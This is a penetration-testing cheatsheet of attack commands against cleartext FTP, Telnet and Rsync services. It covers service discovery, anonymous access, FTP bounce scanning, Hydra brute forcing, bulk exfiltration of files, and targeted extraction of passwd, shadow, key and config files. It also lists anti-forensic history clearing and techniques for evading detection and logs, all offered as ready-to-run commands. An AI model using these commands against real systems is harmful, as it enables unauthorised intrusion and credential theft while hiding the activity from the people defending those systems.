# Cleartext Protocols Cheatsheet

## FTP

### Service Discovery & Banner Grabbing
* Basic FTP connection: `ftp <target_ip>`
* Netcat banner grab: `echo "QUIT" \| nc <target_ip> 21`
* Nmap service detection: `nmap -sV -p 21 <target_ip>`
* Nmap with FTP-specific scripts: `nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 <target_ip>`

### Anonymous Access
* Username: `anonymous`
* Password: `anonymous@example.com` / (blank)

### FTP Bounce Scanning
* Use FTP server as proxy for port scanning: `nmap -b anonymous:anonymous@<ftp_server> <internal_target>`

### Data Exfiltration
* Bulk recursive download: `wget -r ftp://anonymous:anonymous@<target_ip>`
* Advanced FTP client: `lftp ftp://anonymous:anonymous@<target_ip>` → `mirror <remote_path> <local_path>`

## Telnet

### Service Discovery
* Basic Telnet connection: `telnet <target_ip> 23`
* Nmap service detection: `nmap -sV -p 23 <target_ip>`
* Nmap with Telnet-specific scripts: `nmap --script telnet-brute,telnet-encryption,telnet-ntlm-info -p 23 <target_ip>`

### Port Scanning
* Scan common Telnet ports: `nmap -p 23,2223,2322,2323,8023,9999,10001 <target_ip>`
* Service detection on multiple ports: `nmap -sV -p 23,2223,2322,2323,8023,9999,10001 <target_ip>`

### Hydra
* Hydra brute force: `hydra -L usernames.txt -P passwords.txt telnet://<target_ip> -vV -t4 -I`

### Initial Reconnaissance Commands

### Session Enumeration

| Command | Description |
|---------|-------------|
| `who` | Currently logged-in users |
| `w` | System users and their processes |
| `last` | Recent login/logout history |
| `users` | List of current usernames |
| `tty` | Current terminal name |
| `ps -t $(tty)` | Processes running on current terminal |

### Session Cleanup

| Command | Description |
|---------|-------------|
| `history -c` | Clear command history |
| `unset HISTFILE` | Disable history logging |
| `rm ~/.bash_history 2>/dev/null` | Remove history file |
| `unalias ls 2>/dev/null` | Remove command aliases |

## Rsync

### Service Discovery
* Basic Rsync service test and module listing: `rsync <target_ip>::`
* Explicit module listing: `rsync --list-only <target_ip>`
* Scan common Rsync ports: `nmap -p 873,8873,9873 <target_ip>`
* Service detection: `nmap -sV -p 873 <target_ip>`

### Module Enumeration
* Detailed module information: `rsync -av --list-only <target_ip>::<module_name>`
* Test common modules: `for module in backup home www data etc opt var; do echo "Testing module: $module"; rsync --list-only <target_ip>::$module 2>/dev/null; done`

### File Type Hunting
* Search for specific valuable file types: `rsync -avz --list-only <target_ip>::<module>/ \| grep -E '\.(conf\|cfg\|ini\|bak\|sql\|log)$'`

### Data Extraction
* Complete module mirror: `rsync -avz <target_ip>::<module>/ ./rsync_dump/`
* Selective file extraction: `rsync -avz --include="*.conf" --include="*.cfg" --exclude="*" <target_ip>::<module>/ ./configs/`
* Bandwidth-limited extraction: `rsync -avz --bwlimit=100 <target_ip>::<module>/ ./slow_dump/`

### High-Value File Extraction
```bash
rsync -avz --include="*passwd*" --include="*shadow*" --include="*config*" \
--include="*.conf" --include="*.cfg" --include="*.ini" \
--include="*.bak" --include="*.sql" --include="*.key" \
--include="*.pem" --exclude="*" <target_ip>::<module>/ ./intel/
```

### Write Access Testing
1. Create test file: `echo "rsync_test_$(date)" > test_file.txt`
2. Attempt upload: `rsync -avz test_file.txt <target_ip>::<module>`
3. Verify upload: `rsync --list-only <target_ip>::<module>/ \| grep test_file.txt`

## Detection Evasion & Operational Security

### Traffic Obfuscation

| Technique | Command Example |
|-----------|-----------------|
| Bandwidth limiting | `rsync -avz --bwlimit=50 --delay-updates <target>::<module>/ ./stealth_dump` |
| Randomized delays | `sleep $((RANDOM % 300 + 60))` (1-6 minute random delay) |

### Log Evasion

| Protocol | Evasion Technique |
|----------|-------------------|
| FTP | Use realistic email addresses for anonymous login |
| Telnet | Clear command history before disconnect |
| Rsync | Use bandwidth limiting to appear as legitimate sync |

## Common Service Implementations

### FTP Implementations

| Implementation | Typical Banner |
|----------------|----------------|
| vsftpd | `220 (vsFTPd 3.0.3)` |
| ProFTPD | `220 ProFTPD Server` |
| Pure-FTPd | `220 Pure-FTPd Server` |
| FileZilla Server | `220-FileZilla Server` |
| Microsoft IIS | `220 Microsoft FTP Service` |

### Telnet Implementations

| Implementation | Typical Identifier |
|----------------|-------------------|
| Linux telnetd | `Debian GNU/Linux` or similar OS banner |
| Windows Telnet Server | `Welcome to Microsoft Telnet Server` |
| Cisco IOS | `User Access Verification` |
| BusyBox | `Welcome to ... (built-in shell)` |

Reach out: https://linktr.ee/january1073
